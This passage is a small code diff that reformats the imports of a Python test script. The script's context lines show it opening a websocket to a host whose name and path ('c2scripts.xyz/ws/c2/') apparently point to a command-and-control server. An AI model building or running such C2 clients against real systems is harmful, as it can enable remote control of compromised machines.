@@ -1,4 +1,6 @@
-import asyncio, websockets, json
+import asyncio
+import json
+import websockets
 async def test():
     try:
         async with websockets.connect('wss://c2scripts.xyz/ws/c2/') as ws:
